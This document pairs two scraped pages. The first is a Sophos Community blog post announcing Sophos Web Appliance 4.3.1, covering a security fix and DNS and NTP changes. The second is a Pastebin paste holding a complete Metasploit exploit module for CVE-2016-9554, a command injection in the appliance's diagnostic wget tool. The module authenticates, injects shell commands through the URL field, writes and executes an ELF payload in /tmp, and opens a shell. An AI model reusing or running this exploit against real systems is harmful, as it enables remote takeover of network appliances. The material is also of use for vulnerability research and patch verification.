=== Content from community.sophos.com_9d1262cd_20250125_105334.html ===


[![Sophos Community](https://community.sophos.com/cfs-filesystemfile/__key/communityserver-components-imagefileviewer/widgetcontainerfiles-3fc3f82483d14ec485ef92e206116d49-s-AAAAAAAAAAAAAAAAAAAAAA-header-header-Z_2D00_IDKephE0KP_2D00_tiVeHl0_5F00_w-logo/Sophos-Community-Logo-April-2021-White-_2D00_-250x52.png_2D00_125x44.png?_=638693588173209557)](https://community.sophos.com/ "Home")

Sophos Community

* [User](/login?ReturnUrl=%2Fweb-appliance%2Fb%2Fblog%2Fposts%2Frelease-of-swa-version-4-3-1 "Join or sign in")

* Site
* Search
* [User](/login?ReturnUrl=%2Fweb-appliance%2Fb%2Fblog%2Fposts%2Frelease-of-swa-version-4-3-1)
* Toggle Mobile menu

* Community & Product Forums
* Blogs
* Partners
* Events & Webinars
* Getting Started
* [Support Portal](https://support.sophos.com/support/s/)

* Community Blogs
  + [Application Control](/sophos-labs/b/application-control)
  + [Community](/b/community-blog)
  + [Product documentation](/product-documentation/b/blog)
  + [Security](/b/security-blog)
* Feedback
  + [Support Portal](/support-portal/)
  + [Product documentation](/product-documentation/)

* Products
  + Endpoint security
    - [Sophos Endpoint](/intercept-x-endpoint/)
    - [Sophos XDR](/sophos-xdr/)
    - [Sophos Mobile](/sophos-mobile/)
  + Network Security
    - [Sophos Firewall](/sophos-xg-firewall/)
    - [ZTNA](/zero-trust-network-access/)
    - [Sophos Switch](/sophos-switch/)
    - [UTM Firewall](/utm-firewall/)
    - [Sophos Wireless](/sophoswireless/)
    - [NDR](/ndr-community-channel/)
  + Email Security
    - [Sophos
      Email](/sophos-email/)
    - [Phish
      Threat](/phish-threat/)
  + Cloud Security
    - [Sophos Central](/sophos-central/)
    - [Sophos Cloud Optix](/sophos-cloud-optix/)
  + Support Tools
    - [Sophos integrations](/sophos-integrations/)
    - [Free tools](/free-tools/)
* Services
  + Management platform
    - [Sophos Central](https://central.sophos.com/manage/login)
    - [Support Portal](https://support.sophos.com)
    - [Sophos Community log in](/login?ReturnUrl=%2F)

* Sophos Partners
  + [Partners blog](/sophos-partners/)
  + [Local Partner community](/sophos-partners/subgrouplist)
  + [Partner news](https://partnernews.sophos.com/en-us/)
* Resources
  + [MSP guides](/sophos-partners/b)
  + [Partner Care](https://www.sophos.com/en-us/partners/partner-care)
  + [Sophos Central](https://central.sophos.com/manage/login)
* Webinars & Events
  + [Webinars & Events](/sophos-partners/b/webinars-and-events)
  + [Calendar](/sophos-partners/c/14#pifragment-3086=1)
* Become a partner
  + [Join our
    program](/login?ReturnUrl=%2F)

* Events & Webinars
  + [Events & Webinars](/b/events-and-webinars)
  + [Calendar](/c/19#pifragment-3262=1)

* Getting started in the Community
  + [How to get started](/w/getting-started)
  + [SophosID registration](/w/getting-started/90/sophosid-registration)
  + [How to set up your profile](/w/getting-started/88/sophos-community-how-to-set-up-your-profile)
  + [How to contribute and participate](/w/getting-started/86/sophos-community-how-to-contribute-and-participate)
  + [How to manage private messages](/w/getting-started/89/sophos-community-how-to-manage-private-messages)
* Member recognition
  + [Rewards program](/w/member-recognition)
  + [Leaderboard](/leaders)

* Products and Services
  + Products
    - Endpoint security
      * [Sophos Endpoint](/intercept-x-endpoint/)
      * [Sophos XDR](/sophos-xdr/)
      * [Sophos Mobile](/sophos-mobile/)
    - Network Security
      * [Sophos Firewall](/sophos-xg-firewall/)
      * [ZTNA](/zero-trust-network-access/)
      * [Sophos Switch](/sophos-switch/)
      * [UTM Firewall](/utm-firewall/)
      * [Sophos Wireless](/sophoswireless/)
      * [NDR](/ndr-community-channel/)
    - Email Security
      * [Sophos
        Email](/sophos-email/)
      * [Phish
        Threat](/phish-threat/)
    - Cloud Security
      * [Sophos Central](/sophos-central/)
      * [Sophos Cloud Optix](/sophos-cloud-optix/)
    - Support Tools
      * [Sophos integrations](/sophos-integrations/)
      * [Free tools](/free-tools/)
  + Services
    - Management platform
      * [Sophos Central](https://central.sophos.com/manage/login)
      * [Support Portal](https://support.sophos.com)
      * [Sophos Community log in](/login?ReturnUrl=%2F)
* Blogs
  + Community Blogs
    - [Application Control](/sophos-labs/b/application-control)
    - [Community](/b/community-blog)
    - [Product documentation](/product-documentation/b/blog)
    - [Security](/b/security-blog)
  + Feedback
    - [Support Portal](/support-portal/)
    - [Product documentation](/product-documentation/)
* Partners
  + Sophos Partners
    - [Partners blog](/sophos-partners/)
    - [Local Partner community](/sophos-partners/subgrouplist)
    - [Partner news](https://partnernews.sophos.com/en-us/)
  + Resources
    - [MSP guides](/sophos-partners/b)
    - [Partner Care](https://www.sophos.com/en-us/partners/partner-care)
    - [Sophos Central](https://central.sophos.com/manage/login)
  + Webinars & Events
    - [Webinars & Events](/sophos-partners/b/webinars-and-events)
    - [Calendar](/sophos-partners/c/14#pifragment-3086=1)
  + Become a partner
    - [Join our
      program](/login?ReturnUrl=%2F)
* Events & Webinars
  + Events & Webinars
    - [Events & Webinars](/b/events-and-webinars)
    - [Calendar](/c/19#pifragment-3262=1)
* Getting Started
  + Getting started in the Community
    - [How to get started](/w/getting-started)
    - [SophosID registration](/w/getting-started/90/sophosid-registration)
    - [How to set up your profile](/w/getting-started/88/sophos-community-how-to-set-up-your-profile)
    - [How to contribute and participate](/w/getting-started/86/sophos-community-how-to-contribute-and-participate)
    - [How to manage private messages](/w/getting-started/89/sophos-community-how-to-manage-private-messages)
  + Member recognition
    - [Rewards program](/w/member-recognition)
    - [Leaderboard](/leaders)
* [Support Portal](https://support.sophos.com/support/s/)

* [Community Blog](/b)
* [Member Recognition](/w/member-recognition)
* More
* Cancel

[![Web Appliance (Read Only)](https://community.sophos.com/cfs-filesystemfile/__key/communityserver-components-imagefileviewer/communityserver-components-groupavatars-00-00-00-00-12/web_2D00_appliance_2D00_136x136.png.png_2D00_68x68x2.png?_=636109507114810689)](https://community.sophos.com/web-appliance/)

[Web Appliance (Read Only)](https://community.sophos.com/web-appliance/)

[Release Notes & News](https://community.sophos.com/web-appliance/b/blog)

[Release of SWA version 4.3.1](https://community.sophos.com/web-appliance/b/blog/posts/release-of-swa-version-4-3-1)

* [Release Notes & News](/web-appliance/b/blog)
* [Recommended Reads](/web-appliance/f/recommended-reads)
* [Discussions](/web-appliance/f/discussions)
* [Members](/web-appliance/members)
* More
* Cancel

* [New](/login?ReturnUrl=%2Fweb-appliance%2Fb%2Fblog%2Fposts%2Frelease-of-swa-version-4-3-1)

[Web Appliance (Read Only) requires membership for participation - click to join](/login?ReturnUrl=%2Fweb-appliance%2F%3Frequestmembership%3Dtrue)

# [Release of SWA version 4.3.1](https://community.sophos.com/web-appliance/b/blog/posts/release-of-swa-version-4-3-1)

* Subscribe by email
* More
* Cancel

* Share
* Subscribe by email
* More
* Cancel

Related

Recommended

[![RichBaldry](https://community.sophos.com/cfs-filesystemfile/__key/communityserver-components-imagefileviewer/communityserver-components-avatars-00-00-01-20-90/4TXIIIDJJF6D.jpg_2D00_80x80x2.jpg?_=635920072920046267)](/members/richbaldry)

[RichBaldry](/members/richbaldry)

19 Jan 2017

In the past day, we have begun the release of version 4.3.1 of the Sophos Web Appliance. Rollout will continue to customers over the next couple of weeks.

This new version fixes a vulnerability, discovered by Russell Sanford of Critical Start, along with a number of defects that were either discovered in-house or experienced by customers. You can find out more about these fixes in the [Release Notes](http://swa.sophos.com/rn/swa/concepts/ReleaseNotes_4.3.1.html).

A couple of the fixes required behaviour changes that may impact customers on upgrade. If your SWA is configured with multiple DNS servers, and those servers cannot resolve all the same domain information, or if you restrict access from your SWA to NTP services via rules on your network firewalls, you may be affected - so read on.

The DNS change relates to the use of secondary or tertiary DNS servers. Prior to version 4.3.1 the SWA would only switch from using the primary to the secondary after a failure, which for some customers meant that they would experience browsing failures for short periods while the system was waiting for the responses to fail and then switch over.

In version 4.3.1 we are taking a more dynamic approach to us of multiple DNS servers. By optimizing requests between servers, we can be more robust when one server fails. But it does make it more likely that the secondary or tertiary server will come into play from time to time.

If your secondary or tertiary servers cannot resolve some domain names (for example, if your primary is an internal server with Active Directory information, and you use an ISP or other public DNS server for the secondary) you may find that users trying to browse to those non-public domains will occasionally fail. We expect most of you will not be in this situation, but your users do report intermittent failures browsing to local sites, do check your DNS server settings, and check that all your DNS servers are configured correctly.

If you do not have multiple servers hosting your internal DNS information, we recommend you do not configure a public DNS server as a secondary or tertiary.

For more information, see this [knowledgebase article](/kb/en-us/125869).

On the NTP side, we have changed the default NTP server used by the SWA to better reflect the terms of service of the NTP Pool Project. The default is now 0.sophos.pool.ntp.org, which resolves to a different IP address. For most customers, this will not have any impact, but if you are still using the default, and if your firewall has been configured to only allow outbound NTP connections to specific addresses, then the firewall may need to be updated so that your SWA can keep its clock in sync.

To find out more about the NTP Pool Project, [visit their website](http://www.pool.ntp.org/).

Unfiltered HTML

* [Getting started](https://community.sophos.com/w/getting-started)
* [Legal](https://www.sophos.com/en-us/legal.aspx)
* [Privacy](https://www.sophos.com/en-us/legal/sophos-group-privacy-notice.aspx)
* [Cookies](https://www.sophos.com/en-us/legal/cookie-information.aspx)

© 1997 -  Sophos Ltd. All rights reserved.



=== Content from pastebin.com_ece81b36_20250125_105334.html ===


[Pastebin](/)
[API](/doc_api)
[tools](/tools)
[faq](/faq)

[paste](/)

[Login](/login)
[Sign up](/signup)

Advertisement

SHARE
TWEET

![Guest User](/themes/pastebin/img/guest.png)
# sophos\_webapp\_va\_wget\_POST\_cmdi.rb

a guest
Feb 22nd, 2017

5,583
0
Never
[Add comment](/login?return_url=%2FUB8Ye6ZU%23add_comment)

**Not a member of Pastebin yet?**
[**Sign Up**](/signup),
it unlocks many cool features!

[Ruby](/archive/ruby) 5.05 KB
| None
|
[0](/login?return_url=%2FUB8Ye6ZU "Like") [0](/login?return_url=%2FUB8Ye6ZU "Dislike")
[raw](/raw/UB8Ye6ZU)
[download](/dl/UB8Ye6ZU)
[clone](/clone/UB8Ye6ZU)
[embed](/embed/UB8Ye6ZU)
[print](/print/UB8Ye6ZU)
[report](/report/UB8Ye6ZU)

1. # Exploit Title: Sophos Web Appliance diagnostic\_tools wget Remote Command Injection Vulnerability
2. # Date: 12/12/2016
3. # Exploit Author: xort @ Critical Start
4. # Vendor Homepage: www.sophos.com
5. # Software Link: sophos.com/en-us/products/secure-web-gateway.aspx
6. # Version: 4.2.1.3
7. # Tested on: 4.2.1.3
8. #
9. # CVE : CVE-2016-9554
11. # vuln:  diagnostic\_tools command / host parameter /  MgrReport.php exploit
13. # Description PostAuth Sophos Web App FW <= v4.2.1.3 for capabilities. This exploit leverages a command injection bug.
14. #
15. # xort @ Critical Start
17. require 'msf/core'
19. class MetasploitModule < Msf::Exploit::Remote
20. Rank = ExcellentRanking
21. include  Exploit::Remote::Tcp
22. include Msf::Exploit::Remote::HttpClient
24. def initialize(info = {})
25. super(update\_info(info,
26. 'Name'           => 'Sophos Web Appliance <= v4.2.1.3 remote exploit',
27. 'Description'    => %q{
28. This module exploits a remote command execution vulnerability in
29. the Sophos Web Appliance Version <=  v4.2.1.3. The vulnerability exist in
30. a section of the machine's administrative interface for performing diagnostic
31. network test with wget and sanitized user supplied information.
32. },
33. 'Author'         =>
34. [
35. 'xort@Critical Start', # vuln + metasploit module
36. ],
37. 'Version'        => '$Revision: 1 $',
38. 'References'     =>
39. [
40. [ 'none', 'none'],
41. ],
42. 'Platform'      => [ 'linux'],
43. 'Privileged'     => true,
44. 'Arch'          => [ ARCH\_X86 ],
45. 'SessionTypes'  => [ 'shell' ],
46. 'Privileged'     => false,
48. 'Payload'        =>
49. {
50. 'Compat' =>
51. {
52. 'ConnectionType' => 'find',
53. }
54. },
56. 'Targets'        =>
57. [
58. ['Linux Universal',
59. {
60. 'Arch' => ARCH\_X86,
61. 'Platform' => 'linux'
62. }
63. ],
64. ],
65. 'DefaultTarget' => 0))
67. register\_options(
68. [
69. OptString.new('PASSWORD', [ false, 'Device password', "" ]),
70. OptString.new('USERNAME', [ true, 'Device password', "admin" ]),
71. OptString.new('CMD', [ false, 'Command to execute', "" ]),
72. Opt::RPORT(443),
73. ], self.class)
74. end
76. def do\_login(username, password\_clear)
77. vprint\_status( "Logging into machine with credentials...\n" )
79. # vars
80. timeout = 1550;
81. style\_key = Rex::Text.rand\_text\_hex(32)
83. # send request
84. res = send\_request\_cgi(
85. {
86. 'method'  => 'POST',
87. 'uri'     => "/index.php",
88. 'vars\_get' => {
89. 'c' => 'login',
90. },
91. 'vars\_post' =>
92. {
94. 'STYLE' => style\_key,
95. 'destination' => '',
96. 'section' => '',
97. 'username' => username,
98. 'password' => password\_clear,
99. }
100. }, timeout)
102. return style\_key
103. end
105. def run\_command(username, style\_password, cmd)
107. vprint\_status( "Running Command...\n" )
109. # send request with payload
110. res = send\_request\_cgi({
111. 'method' => 'POST',
112. 'vars\_post' => {
113. 'action' => 'wget',
114. 'section' => 'configuration',
115. 'STYLE' => style\_password ,
116. 'url' => 'htt%3a%2f%2fwww.google.com%2f`'+cmd+'`',
117. },
118. 'vars\_get' => {
119. 'c' => 'diagnostic\_tools',
120. },
121. })
123. end
126. def exploit
127. # timeout
128. timeout = 1550;
130. # params
131. password\_clear = datastore['PASSWORD']
132. user = datastore['USERNAME']
134. # do authentication
135. style\_hash = do\_login(user, password\_clear)
137. vprint\_status("STATUS hash authenticated: #{style\_hash}\n")
139. # pause to let things run smoothly
140. sleep(5)
142. #if no 'CMD' string - add code for root shell
143. if not datastore['CMD'].nil? and not datastore['CMD'].empty?
145. cmd = datastore['CMD']
147. # Encode cmd payload
148. encoded\_cmd = cmd.unpack("H\*").join().gsub(/(\w)(\w)/,'\\x\1\2')
150. # kill stale calls to bdump from previous exploit calls for re-use
151. run\_command(user, style\_hash, ("sudo%20/bin/rm%20-f%20/tmp/n%20;printf%20\"#{encoded\_cmd}\"%20>%20/tmp/n;%20chmod%20+rx%20/tmp/n;/tmp/n" ))
152. else
153. # Encode payload to ELF file for deployment
154. elf = Msf::Util::EXE.to\_linux\_x86\_elf(framework, payload.raw)
155. encoded\_elf = elf.unpack("H\*").join().gsub(/(\w)(\w)/,'\\\\\\x\1\2')
157. # upload elf to /tmp/m , chmod +rx /tmp/m , then run /tmp/m (payload)
158. run\_command(user, style\_hash, ("echo%20-e%20#{encoded\_elf}\>%20/tmp/m\;chmod%20%2brx%20/tmp/m\;/tmp/m"))
160. # wait for magic
161. handler
163. end
166. end
167. # sophox-release
168. end

Advertisement

Add Comment
Please, [**Sign In**](/login?return_url=%2FUB8Ye6ZU%23add_comment) to add comment

Advertisement

[Public Pastes](/archive)

* [⭐ FREE giftcards method AO](/BxV8SQYg)
  JavaScript |
  1 sec ago
  | 0.18 KB
* [BTC ACCOUNTS HACKED](/KU2ymbNS)
  JavaScript |
  4 sec ago
  | 0.09 KB
* [⭐ FREE giftcards method](/FZ5tiuCM)
  JavaScript |
  5 sec ago
  | 0.05 KB
* [⭐ Binance Account hack 1J](/8E43JakP)
  JavaScript |
  5 sec ago
  | 0.18 KB
* [⭐ giftcards for free](/T5H4gd7p)
  JavaScript |
  6 sec ago
  | 0.05 KB
* [⭐ Binance Account hack 8T](/6Dj1sbN9)
  JavaScript |
  9 sec ago
  | 0.18 KB
* [⭐ Binance Account hack 2F](/Q3yTgbpR)
  JavaScript |
  9 sec ago
  | 0.18 KB
* [⭐ get any gift card for NK](/HGriPSpE)
  JavaScript |
  13 sec ago
  | 0.18 KB

Advertisement

[create new paste](/)  /
[syntax languages](/languages)  /
[archive](/archive)  /
[faq](/faq)  /
[tools](/tools)  /
[night mode](/night_mode)  /
[api](/doc_api)  /
[scraping api](/doc_scraping_api)  /
[news](/news)  /
[pro](/pro)

[privacy statement](/doc_privacy_statement)  /
[cookies policy](/doc_cookies_policy)  /
[terms of service](/doc_terms_of_service) /
[security disclosure](/doc_security_disclosure)  /
[dmca](/dmca)  /
[report abuse](/report-abuse)  /
[contact](/contact)

By using Pastebin.com you agree to our [cookies policy](/doc_cookies_policy) to enhance your experience.

Site design & logo © 2025 Pastebin

We use cookies for various purposes including analytics. By continuing to use Pastebin, you agree to our use of cookies as described in the [Cookies Policy](/doc_cookies_policy).  OK, I Understand

[![](/themes/pastebin/img/hello.webp)](/signup)

Not a member of Pastebin yet?


